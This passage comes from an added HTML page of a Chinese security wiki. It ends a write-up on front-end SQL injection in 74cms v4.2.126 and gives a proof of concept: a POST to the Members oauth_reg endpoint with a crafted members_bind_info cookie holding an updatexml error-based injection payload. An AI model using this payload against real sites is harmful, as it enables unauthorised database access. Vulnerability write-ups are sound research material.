+<span class="n">登录权限</span><span class="err">：</span><span class="n">普通用户</span><span class="o">/</span><span class="n">企业用户都可</span>
+<span class="nl">url</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mi">74</span><span class="n">cms</span><span class="p">.</span><span class="n">test</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">Members</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">oauth_reg</span>
+<span class="nl">post</span><span class="p">:</span>
+<span class="w">    </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">自己去平台随便注册个账号然后输入那个账号</span>
+<span class="w">    </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">自己去平台随便注册个账号然后输入那个密码</span>
+<span class="nl">cookie</span><span class="p">:</span>
+<span class="w">    </span><span class="n">members_bind_info</span><span class="o">[</span><span class="n">type</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="k">match</span><span class="p">;</span>
+<span class="n">members_bind_info</span><span class="o">[</span><span class="n">type</span><span class="o">][</span><span class="n">1</span><span class="o">][</span><span class="n">0</span><span class="o">]=</span><span class="n">aaaaaaa</span><span class="o">%</span><span class="mi">22</span><span class="p">)</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="c1">-- a;</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png" /></p>
+<p>看源码</p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png" /></p>
+<p><img alt="" src="../resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png" /></p>
+<h2 id="_1">四、参考链接<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl">https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        74cms v4.2.126-任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
